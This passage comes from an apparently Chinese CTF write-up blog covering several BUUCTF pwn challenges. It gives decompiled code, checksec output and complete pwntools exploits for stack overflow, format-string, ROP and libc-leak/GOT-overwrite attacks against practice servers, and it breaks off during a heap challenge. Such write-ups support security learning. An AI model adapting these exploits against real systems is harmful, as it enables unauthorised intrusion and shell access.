<h3 id="2ida-5"><a class="markdownIt-Anchor" href="#2ida-5"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter username: &quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">  User::read_name((User *)&amp;login);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter password: &quot;</span>);</span><br><span class="line">  v3 = (<span class="type">void</span> (*)(<span class="type">void</span>))main::&#123;lambda(<span class="type">void</span>)#<span class="number">1</span>&#125;::operator <span class="type">void</span> (*)(<span class="type">void</span>) <span class="type">const</span>();</span><br><span class="line">  v7 = password_checker(v3);</span><br><span class="line">  User::read_password((User *)&amp;login);</span><br><span class="line">  v4 = User::get_password((User *)&amp;v8);</span><br><span class="line">  v5 = User::get_password((User *)&amp;login);</span><br><span class="line">  password_checker(<span class="type">void</span> (*)(<span class="type">void</span>))::&#123;lambda(<span class="type">char</span> <span class="type">const</span>*,<span class="type">char</span> <span class="type">const</span>*)#<span class="number">1</span>&#125;::operator() <span class="type">const</span>(</span><br><span class="line">    (<span class="type">void</span> (__fastcall ***)(<span class="type">char</span> *))&amp;v7,</span><br><span class="line">    (<span class="type">const</span> <span class="type">char</span> *)v5,</span><br><span class="line">    (<span class="type">const</span> <span class="type">char</span> *)v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><strong>password_checker</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">password_checker</span><span class="params">(<span class="type">void</span> (*)(<span class="type">void</span>))</span>::&#123;lambda(<span class="type">char</span> <span class="type">const</span>*,<span class="type">char</span> <span class="type">const</span>*)#<span class="number">1</span>&#125;::operator() <span class="type">const</span>(<span class="type">void</span> (__fastcall ***a1)(<span class="type">char</span> *), <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">const</span> <span class="type">char</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a2, a3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x50</span>uLL, <span class="string">&quot;Password accepted: %s\n&quot;</span>, &amp;s);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    (**a1)(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>strcmp</code>遇见<code>\x00</code>截断，不会判断之后的字符串，所以这里栈溢出</p>
</blockquote>
<h3 id="3exp-5"><a class="markdownIt-Anchor" href="#3exp-5"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25930</span>)</span><br><span class="line">back_door = <span class="number">0x400E88</span></span><br><span class="line">payload = <span class="string">&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">&quot;\x00&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">&quot;\x00&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">36</span>+p64(back_door)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;username: &quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;password: &quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="第五空间2019-决赛pwn5"><a class="markdownIt-Anchor" href="#第五空间2019-决赛pwn5"></a> [第五空间2019 决赛]PWN5</h2>
<p>环境：ubuntu16</p>
<h3 id="1checksec-6"><a class="markdownIt-Anchor" href="#1checksec-6"></a> 1.checksec()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-6"><a class="markdownIt-Anchor" href="#2ida-6"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// et1</span></span><br><span class="line">  <span class="type">char</span> nptr; <span class="comment">// [esp+4h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+14h] [ebp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v9; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;a1;</span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);							<span class="comment">//====+FORMAT+====</span></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);                                 </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);                         <span class="comment">// ====+STACK_OVERFLOW+====</span></span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = v5 ^ v8;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != v8 )</span><br><span class="line">    sub_80493D0(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unk_804C044</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bss:0804C040 byte_804C040    db ?                    ; DATA XREF: sub_8049140↑o</span><br><span class="line">.bss:0804C040                                         ; sub_8049140+5↑o ...</span><br><span class="line">.bss:0804C041                 align 4</span><br><span class="line">.bss:0804C044 randmon_num     db    ? ;               ; DATA XREF: main+77↑o</span><br><span class="line">.bss:0804C044                                         ; main+108↑o</span><br><span class="line">.bss:0804C045                 db    ? ;</span><br><span class="line">.bss:0804C046                 db    ? ;</span><br><span class="line">.bss:0804C047                 db    ? ;</span><br><span class="line">.bss:0804C047 _bss            ends</span><br><span class="line">.bss:0804C047</span><br></pre></td></tr></table></figure>
<blockquote>
<p>bss段的unk_804C044，是随机生成的，而我们猜对了这个参数，就可以执行system(“/bin/sh”),刚好字符串格式化漏洞可以实现改写内存地址的值</p>
<p>还有就是不要被开启的canary保护迷惑</p>
</blockquote>
<h3 id="3计算偏移"><a class="markdownIt-Anchor" href="#3计算偏移"></a> 3.计算偏移</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@joe1sn:~/download/BUUCTF/PWN5# ./pwn </span><br><span class="line">your name:aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">Hello,aaaa-0xffb44588-0x63-(nil)-(nil)-0x3-0xf7f8c950-0xc2-(nil)-0xc30000-0x61616161-0x2d70252d-0x252d7025-0x70252d70</span><br></pre></td></tr></table></figure>
<p>第一个参数偏移量为10，通过%n修改</p>
<blockquote>
<p>%x是吧数据以16进制输出</p>
<p>%n是把已经输出的字符数目输入传来参数的地址中，这就可以使我们修改数据</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0xJDchen/p/5904816.html">https://www.cnblogs.com/0xJDchen/p/5904816.html</a></p>
<h3 id="4exp"><a class="markdownIt-Anchor" href="#4exp"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26486</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044 = <span class="number">0x0804C044</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;unk_804C044:<span class="number">0x11111111</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your passwd&quot;</span>,<span class="built_in">str</span>(<span class="number">0x11111111</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0ctf_2016_warmup"><a class="markdownIt-Anchor" href="#0ctf_2016_warmup"></a> 0ctf_2016_warmup</h2>
<h3 id="1checksec-7"><a class="markdownIt-Anchor" href="#1checksec-7"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-7"><a class="markdownIt-Anchor" href="#2ida-7"></a> 2.IDA</h3>
<p>从汇编看有四个函数</p>
<p><strong>Alarm 、Read 、Write 、sys_exit</strong></p>
<p>关于 <strong>Alarm</strong> 有个特性：</p>
<blockquote>
<p>如果有以前为进程登记的尚未超时的闹钟时钟，而且本次调用的seconds值是0，则取消以前的闹钟时钟，其余留值仍作为alarm函数的返回值</p>
</blockquote>
<p>那么当 <strong>alarm</strong> 剩余 5 秒时，更具汇编fastcall，会将return值返回 <strong>eax</strong> 寄存器中，那么再次使用 <strong>sys_call</strong> 的时候就会 <strong>系统调用 open函数</strong> ，从而读取到falg的值</p>
<h3 id="3exp-6"><a class="markdownIt-Anchor" href="#3exp-6"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&quot;warmup&quot;</span></span><br><span class="line">elf = ELF(name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip,port,debug,mode</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(name)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	main_addr = <span class="number">0x804815A</span></span><br><span class="line">	write_addr = <span class="number">0x8048135</span></span><br><span class="line">	read_addr  = <span class="number">0x804811D</span> </span><br><span class="line">	alarm_addr = <span class="number">0x804810D</span></span><br><span class="line">	data_seg = <span class="number">0x80491BC</span></span><br><span class="line">	sys_call = <span class="number">0x804813A</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">#Step1</span></span><br><span class="line">    <span class="comment">#向系统中传递参数 &quot;flag&quot;</span></span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">	payload += p32(read_addr)+p32(main_addr)</span><br><span class="line">	payload += p32(<span class="number">0</span>)+p32(data_seg)+p32(<span class="number">0x10</span>)</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Welcome to 0CTF 2016!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&#x27;flag\x00&#x27;</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Good Luck!\n&quot;</span>,payload)	</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#Step2</span></span><br><span class="line">    <span class="comment">#0xa-5=5</span></span><br><span class="line">    <span class="comment">#这样剩下的就5s了</span></span><br><span class="line">	sleep(<span class="number">5</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#Step3</span></span><br><span class="line">    <span class="comment">#再次调用alarm函数就会返回剩余的秒数5到 eax寄存器中</span></span><br><span class="line">    <span class="comment">#就会将falg文件读取到 data段</span></span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">	payload += p32(alarm_addr)+p32(sys_call)</span><br><span class="line">	payload += p32(main_addr)+p32(data_seg)+p32(<span class="number">0</span>)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">    </span><br><span class="line">	<span class="comment">#Step4</span></span><br><span class="line">    <span class="comment">#从data段中read</span></span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">	payload += p32(read_addr)+p32(main_addr)</span><br><span class="line">	payload += p32(<span class="number">3</span>)+p32(data_seg)+p32(<span class="number">0x50</span>)</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Good Luck!\n&quot;</span>,payload)	</span><br><span class="line">    </span><br><span class="line">	<span class="comment">#Step5</span></span><br><span class="line">    <span class="comment">#利用write写出flag</span></span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">	payload += p32(write_addr)+p32(main_addr)</span><br><span class="line">	payload += p32(<span class="number">1</span>)+p32(data_seg)+p32(<span class="number">0x50</span>)</span><br><span class="line">	sh.sendafter(<span class="string">&#x27;Good Luck!\n&#x27;</span>,payload)</span><br><span class="line"> 	sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28290&quot;</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="axb_2019_fmt32"><a class="markdownIt-Anchor" href="#axb_2019_fmt32"></a> axb_2019_fmt32</h2>
<h3 id="1cheksec"><a class="markdownIt-Anchor" href="#1cheksec"></a> 1.cheksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2-ida"><a class="markdownIt-Anchor" href="#2-ida"></a> 2 .IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x101</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;format, <span class="number">0</span>, <span class="number">0x12C</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;format, <span class="string">&quot;Repeater:%s\n&quot;</span>, &amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>字符串格式化漏洞，但是没有后门，可以选择<code>libc leak</code>+改printf为<code>one gadget</code></p>
</blockquote>
<h3 id="3exp-7"><a class="markdownIt-Anchor" href="#3exp-7"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25318</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x3a80c execve(&quot;/bin/p&quot;, esp+0x28, environ)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;me:&#x27;</span>,<span class="string">&quot;%9$sA&quot;</span> + p32(elf.got[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Repeater:&#x27;</span>)</span><br><span class="line">printf_got = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base = printf_got - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;printf addr: %x&quot;</span> , printf_got)</span><br><span class="line">log.success(<span class="string">&quot;system addr: %x&quot;</span> , system)</span><br><span class="line">log.success(<span class="string">&quot;libc base: %x&quot;</span> , base)</span><br><span class="line">payload  =<span class="string">&#x27;aaaaa&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">9</span>,&#123;<span class="number">0x804A014</span>: (<span class="number">0x3a80c</span>+base)&#125;,write_size = <span class="string">&quot;byte&quot;</span>,numbwritten = <span class="number">0xe</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;me:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="axb_2019_heap"><a class="markdownIt-Anchor" href="#axb_2019_heap"></a> axb_2019_heap</h2>
<h3 id="1checksec-8"><a class="markdownIt-Anchor" href="#1checksec-8"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-8"><a class="markdownIt-Anchor" href="#2ida-8"></a> 2.IDA</h3>
<p><strong>banner</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;format);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>, &amp;format);</span><br><span class="line"> <span class="built_in">printf</span>(&amp;format);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>存在一个字符串格式化漏洞</p>
</blockquote>
<p><strong>main</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br></pre></td></tr></table></figure>
<p><strong>edit_note</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">10</span> &amp;&amp; v1 &gt;= <span class="number">0</span> &amp;&amp; *((_QWORD *)&amp;note + <span class="number">2</span> * v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">    get_input(*((_QWORD *)&amp;note + <span class="number">2</span> * v1), *((_DWORD *)&amp;note + <span class="number">4</span> * v1 + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有控制范围，堆溢出，利用<code>unlink</code>+<code>free_hook</code>来getshell</p>
</blockquote>
<h3 id="3gdb"><a class="markdownIt-Anchor" href="#3gdb"></a> 3.GDB</h3>
<p>在printf处下断点fmtarg查看偏移</p>
<p><strong>stack</strong></p>
